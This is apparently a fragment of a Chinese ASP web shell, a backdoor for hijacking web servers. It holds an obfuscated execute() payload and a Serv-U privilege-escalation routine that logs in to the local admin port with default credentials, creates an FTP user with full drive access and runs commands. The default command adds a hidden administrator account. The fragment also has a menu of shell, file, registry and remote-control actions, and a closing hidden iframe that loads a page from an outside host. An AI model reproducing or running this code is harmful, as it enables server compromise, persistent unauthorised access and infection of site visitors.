if:set adoConn = Nothing:j request.form("MMD") & "<br>"& strResult:end FuncTion:case "Alexa"
dim AlexaUrl,Top:AlexaUrl=request("u"):Top=Alexa(AlexaUrl):if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
execute(king("`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<本版器务服ASK>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/<`&)`UB`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<统系作操器务服>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/<`&)`UNBUUSZBNY_XB_NSATMG`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<量数MYZ器务服>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/< `&vgf&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<间时器务服>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>dkgy/<>kz/<>rz/<>'9'=txsqc 'fgozeq'=tdqf 'ftrroi'=thnz zxhfo<>'bh1:ktrkgw'=tsnzl'_______________'=txsqc 'zodwxl'=thnz zxhfo<>'bh1:ktrkgw'=tsnzl'`&)`NWWQ_VQZBV`(ltswqokqIktcktU.zltxjtN&`'=txsqc '60'=tmol 'ho'=tdqf 'zbtz'=thnz zxhfo<>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<YC器务服>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>'afqsw_'=ztukqz 'dkgyho'=tdqf 'hlq.ho/tktiv/wtv/ukg.sstilwtv//:hzzi'=fgozeq zlgh=rgiztd dkgy<>kz/<>rz/<`&)`STQG_NSINSU`(ltswqokqIktcktl.zltxjtk&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<名器务服>'XXXXXX#'=kgsgeuw '119'=izrov '19'=ziuoti rz<>'ktzfte'=fuosq kz<>kz/<>rz/<息信件组器务服>'xftd'=kgsgeuw 'ktzfte'=fuosq '8'=fqhlsge '19'=ziuoti rz<>kz<>'ktzfte'=fuosq '1'=uforrqhsste '0'=ufoeqhlsste '1'=ktrkgw 'xftd'=kgsgeuw '%13'=izrov tswqz<>kw<`=CU"))
For i=0 To 18
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
j SI
Err.Clear
Function bytes2BSTR(vIn) 
dim strReturn 
dim i1,ThisCharCode,NextCharCode 
strReturn = "" 
For i1 = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i1,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i1+1,1)) 
strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i1 = i1 + 1 
End If 
Next 
bytes2BSTR = strReturn 
    Err.Clear
End Function
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
j"<script language='javascript'>"
j"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
j"setTimeout('document.all.goldsun.submit();',4000);"
j"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
j"<script language='javascript'>"
j"document.write('<center>正在提升权限,请等待...,<center>');"
j"setTimeout(""document.all.goldsun.submit();"",4000);"
j"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
j"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
j"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
j"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
j"<center><form method='post' name='goldsun'>"
j"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
j"<tr align='center' valign='middle'>"
j"<td colspan='2'>Serv-U 提升权限 by Sam</td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td width='100'>用户名:</td>"
j"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>口 令：</td>"
j"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>端 口：</td>"
j"<td><input name='port' type='text' id='port' value='43958'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>系统路径：</td>"
j" <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td>命　令：</td>"
j" <td><input name='c' type='text' id='c' value='cmd /c net user admin7s$ 1 /add & net localgroup administrators admin7s$ /add' size='50'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td colspan='2'><input type='submit' name='Submit' value='提交'> "
j"<input type='reset' name='Submit2' value='重置'>"
j"<input name='SUaction' type='hidden' id='action' value='1'></td>"
j"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject(CONST_FSO)
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case"MMD":MMD()
case"ReadREG":call ReadREG()
case"delpoint":call delpoint()
case"Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
case"DownFile":DownFile FName:ShowErr()
case"DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
case"EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
case"CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
case"MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
case"DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
case"CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
case"MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
case"NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
case"UpFile":UpFile()
case"TSearch":TSearch()
case"pcanywhere4":pcanywhere4()
case"Cmd1Shell":Cmd1Shell()
case"Logout":Session.Contents.Remove("kkk"):Response.Redirect URL
case"Course":Course()
case"Alexa":Alexa()
case"suftp":suftp()
case"upload":upload()
case"radmin":radmin()
case"pcanywhere4":pcanywhere4()
case"goback":goback()
Case "ProFile":ProFile()
case"php":php()
case"apjdel":apjdel()
case"cmdx":cmdx()
case"aspx":aspx()
case"hiddenshell":hiddenshell()
case"ScanDriveForm" : ScanDriveForm
Case "CustomScanDriveForm":CustomScanDriveForm()
case"ScanDrive" : ScanDrive Request("Drive")
case"ScFolder"  : ScFolder Request("Folder")
  Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
j"</body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>"  %>
